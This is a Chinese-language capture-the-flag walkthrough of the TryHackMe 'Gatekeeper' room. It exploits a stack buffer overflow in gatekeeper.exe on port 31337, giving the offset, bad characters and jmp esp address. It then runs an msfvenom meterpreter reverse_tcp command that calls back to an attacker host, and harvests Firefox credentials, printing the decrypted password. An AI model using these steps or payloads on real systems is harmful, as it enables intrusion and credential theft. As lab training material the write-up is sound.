# Gatekeeper

你能越过大门，穿过火堆吗？

---

nmap扫

    135/tcp   open  msrpc
    139/tcp   open  netbios-ssn
    445/tcp   open  microsoft-ds
    31337/tcp open  Elite
    49152/tcp open  unknown
    49153/tcp open  unknown
    49154/tcp open  unknown
    49160/tcp open  unknown
    49161/tcp open  unknown
    49164/tcp open  unknown

先进smb看看有没有东西

    smbclient -L 10.10.90.4

有一个Users目录，连接进去之后搜寻一番发现了：

    gatekeeper.exe

先下载下来，根据经验，用nc尝试连接那个几个端口

连接31337端口后随便输点东西，然后它就崩了🤣

好吧其实它会接收输入的数据，刚刚输了点东西它崩了，不出意外就是栈溢出了

由于我没windows相应的调试环境，那就再借这个https://tryhackme.com/room/bufferoverflowprep 房间的windows靶机用一下。

还是利用Immunity Debugger打开gatekeeper.exe

    !mona config -set workingfolder c:\mona\%p

然后还是fuzz一波，再100字节上下就崩了。

我们生成200字节随机数据试一下

    /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 200

    !mona findmsp -distance 200

得出：

    EIP contains normal pattern : 0x39654138 (offset 146)

把200字节的随机数据删掉，我们自己生成146字节数据填充。

随便用四字节字符覆盖eip: "BBBB"

### 查找坏字符

    !mona bytearray -b "\x00"

    !mona compare -f C:\mona\gatekeeper\bytearray.bin -a <eip_addr>

\x0a上榜，去掉后：

    Unmodified

那么最终答案就是 \x00\x0a

### 找jmp esp地址：

    !mona jmp -r esp -cpb "\x00\x0a"

    盲猜一手小端序：将jmp esp地址倒转:

    080414c3 -> \xc3\x14\x04\x08

### 生成shellcode

    msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.14.39.48 LPORT=8888 EXITFUNC=thread -b "\x00\x0a" -f c

    在shellcode前面加 \x90 * 16或更多

将脚本ip改回本房间的靶机ip，运行

成功getshell

desktop下还有一个FireFox.lnk，根据提示：

    run post/multi/gather/firefox_creds

然后将文件名恢复，并使用firefox_decrypt.py恢复凭据：

    python3 /home/sugobet/firefox_decrypt.py ./

.

    Website:   https://creds.com
    Username: 'mayor'
    Password: '8CL7O1N78MdrCIsV'

rdp连进去，root.txt就在桌面
